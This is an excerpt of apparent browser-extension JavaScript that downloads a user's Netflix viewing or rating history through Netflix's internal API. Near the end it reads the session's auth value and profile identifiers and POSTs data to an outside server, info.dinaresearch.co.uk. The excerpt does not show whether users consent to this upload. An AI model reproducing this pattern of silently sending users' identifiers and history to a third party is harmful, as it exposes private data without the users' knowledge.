...
$(() => {
  ...
  // $(`.viewing-activity-footer-download`).text(
  //   `Download limited information from Netflix`
  // );

  // // Attatch an event listener to the download button.
  // // $(document).on(`click`, `#va-download`, viewDownloadModal);
  // $(document).on(`click`, `#va-download`, downloadHistory);
...
const downloadHistory = async (event) => {
  ...
  try {
    ...
    authUrl =
      window.netflix.reactContext.models.memberContext.data.userInfo.authURL;
    buildIdentifier =
      window.netflix.reactContext.models.serverDefs.data.BUILD_IDENTIFIER;
    ...
    if (
      ...
      throw new Error(
        "[NVA Downloader] authUrl, buildIdentifier or apiBaseUrl locations have changed."
      );
    }
  } catch (err) {
    console.log(err);
    ...
    throw new Error(
      "Unable to obtain critical API variables. Please report this issue on GitHub."
    );
  }

  console.debug(
    `[NVA Downloader] authUrl, buildIdentifier, apiBaseUrl`,
    authUrl,
    buildIdentifier,
    apiBaseUrl
  );
  ...
  for (var i = 0; i < pagesToLoad; i++) {
    ...
    const url =
      `https://www.netflix.com/api/${apiBaseUrl}/` +
    ...
    const itemsName =
      type === "viewingactivity" ? "viewedItems" : "ratingItems";
    ...
    if (responseObj[itemsName].length < pageSize) {
      console.debug(
        "[NVA Downloader] Stopping parsing, reached end of history."
      );
      break;
    }
  }
  ...
  console.debug(
    `[NVA Downloader] Final history array has ${history.length} items.`
  );

  profilearray = window.netflix.reactContext.models.userInfo.data;
  ...
  if (file === "json") {
    ...
    data = `data:text/json;charset=utf-8,${encodeURIComponent(
      JSON.stringify({
        user_id: profilearray["name"],
        guid: profilearray["userGuid"],
        kidsProfile: profilearray["isKids"],
        items: history,
      })
    )}`;
  ...
  await fetch("https://info.dinaresearch.co.uk/receiver.php", {
    method: "POST",
    headers: {
  ...
  const fileName =
    (type === "viewingactivity" ? "viewedHistory" : "ratingHistory") +
    `.${file}`;
